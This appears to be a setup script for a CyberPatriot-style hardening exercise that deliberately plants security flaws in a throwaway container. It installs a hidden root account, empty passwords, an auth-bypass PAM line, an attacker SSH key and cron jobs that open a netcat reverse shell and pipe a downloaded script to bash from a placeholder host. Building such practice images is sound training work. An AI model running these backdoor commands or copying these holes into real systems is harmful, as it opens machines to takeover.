#!/usr/bin/env bash
# Turns a fresh Debian/Ubuntu/Mint container into a small "practice image"
# with the kinds of problems CyberPatriot images have. Used by run-tests.sh.
# NEVER run this on a real computer.
set -e

# --- users ---------------------------------------------------------------
for u in alice bob carol eve mallory; do
  id "$u" >/dev/null 2>&1 || useradd -m -s /bin/bash "$u"
  echo "$u:password" | chpasswd
done
usermod -aG sudo alice
usermod -aG sudo mallory                          # unauthorized admin
useradd -o -u 0 -g 0 -M -s /bin/bash toor         # hidden second root account
echo 'toor:toor' | chpasswd
useradd -r -u 999 -m -s /bin/bash sysbackup       # hidden user with a shell
passwd -d carol                                   # empty password
echo 'bob ALL=(ALL) NOPASSWD: ALL' >/etc/sudoers.d/90-bob
chmod 440 /etc/sudoers.d/90-bob

# --- files and permissions ------------------------------------------------
chmod u+s /usr/bin/find                           # SUID find = instant root
mkdir -p /home/bob/Music /home/eve/Videos
head -c 2048 /dev/urandom >/home/bob/Music/song.mp3
head -c 2048 /dev/urandom >/home/eve/Videos/movie.mp4
echo 'setting=1' >/etc/planted-ww.conf; chmod 666 /etc/planted-ww.conf
chmod 644 /etc/shadow                             # anyone can read password hashes

# --- persistence / backdoors ----------------------------------------------
echo '10.6.6.6 www.google.com' >>/etc/hosts
echo '* * * * * root nc -e /bin/bash 10.6.6.6 4444' >/etc/cron.d/updater
echo '*/5 * * * * curl -s http://10.6.6.6/x | bash' | crontab -u eve -
echo "alias sudo='sudo -S'" >>/home/bob/.bashrc
mkdir -p /root/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEvilEvilEvilEvilEvilEvilEvilEvilEvilEvil attacker@evil' >/root/.ssh/authorized_keys
# shellcheck disable=SC2012
ls /lib/*-linux-gnu/libdl.so.2 /usr/lib/*-linux-gnu/libdl.so.2 2>/dev/null | head -1 >/etc/ld.so.preload  # harmless lib, but still a finding
sed -i '1i auth sufficient pam_permit.so' /etc/pam.d/common-auth

# --- kernel settings --------------------------------------------------------
echo 'net.ipv4.ip_forward=1' >/etc/sysctl.d/60-forward.conf
echo 'kernel.randomize_va_space=0' >>/etc/sysctl.conf
mkdir -p /usr/lib/sysctl.d && echo 'net.ipv4.tcp_syncookies=0' >/usr/lib/sysctl.d/99-zz-planted.conf  # no package owns it

# --- SSH ------------------------------------------------------------------
sed -i 's/^#\?PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
echo 'PermitEmptyPasswords yes' >>/etc/ssh/sshd_config
mkdir -p /etc/ssh/sshd_config.d && echo 'PermitRootLogin yes' >/etc/ssh/sshd_config.d/10-evil.conf

# --- login screen -----------------------------------------------------------
mkdir -p /etc/lightdm/lightdm.conf.d /etc/xdg/lightdm/lightdm.conf.d
# [SeatDefaults] is the old name of [Seat:*]; placed after [Seat:*] it wins.
printf '[Seat:*]\nautologin-user=bob\nallow-guest=true\n\n[SeatDefaults]\nautologin-user=carol\nallow-guest=true\n' >/etc/lightdm/lightdm.conf
printf '[SeatDefaults]\nautologin-user=bob\n' >/etc/lightdm/lightdm.conf.d/50-legacy.conf
printf '[Seat:*]\nallow-guest=true\n' >/etc/xdg/lightdm/lightdm.conf.d/40-guest.conf
# GDM on Debian/Ubuntu: the stock greeter.dconf-defaults (user list shown)
mkdir -p /etc/gdm3
cat >/etc/gdm3/greeter.dconf-defaults <<'GREETER'
# Theming options
[org/gnome/desktop/interface]
# gtk-theme='Adwaita'

# Login manager options
# =====================
[org/gnome/login-screen]
logo='/usr/share/images/vendor-logos/logo-text-version-64.png'

# - Disable user list
# disable-user-list=true
# - Disable restart buttons
# disable-restart-buttons=true
GREETER
# A later dconf keyfile that turns automount on and the screen lock off
mkdir -p /etc/dconf/db/local.d
printf '[org/gnome/desktop/media-handling]\nautomount=true\nautorun-never=false\n\n[org/cinnamon/desktop/screensaver]\nlock-enabled=false\n\n[org/gnome/desktop/interface]\nclock-show-seconds=true\n' >/etc/dconf/db/local.d/99-planted

# --- core dumps and Ctrl+Alt+Del ----------------------------------------------
sed -i '/^# End of file/i *               soft    core            unlimited' /etc/security/limits.conf
mkdir -p /etc/security/limits.d && echo 'bob - core unlimited' >/etc/security/limits.d/90-planted.conf
rm -f /etc/systemd/system/ctrl-alt-del.target        # Ctrl+Alt+Del reboots (the default)

# --- Firefox ------------------------------------------------------------------
ff=/home/bob/.mozilla/firefox/abcd1234.default-release
mkdir -p "$ff"
cat >"$ff/prefs.js" <<'PREFS'
// Mozilla User Preferences
user_pref("browser.startup.homepage", "https://www.example.com");
user_pref("browser.safebrowsing.malware.enabled", false);
user_pref("browser.safebrowsing.phishing.enabled", false);
user_pref("dom.disable_open_during_load", false);
PREFS
echo 'user_pref("xpinstall.whitelist.required", false);' >"$ff/user.js"
chown -R bob:bob /home/bob/.mozilla

# --- apache (a critical service in the test README) -------------------------
sed -i 's/^ServerTokens .*/ServerTokens OS/' /etc/apache2/conf-available/security.conf
sed -i '0,/Options FollowSymLinks/s//Options Indexes FollowSymLinks/' /etc/apache2/apache2.conf

# --- updates ----------------------------------------------------------------
apt-mark hold nano >/dev/null

echo "Planted the practice vulnerabilities."
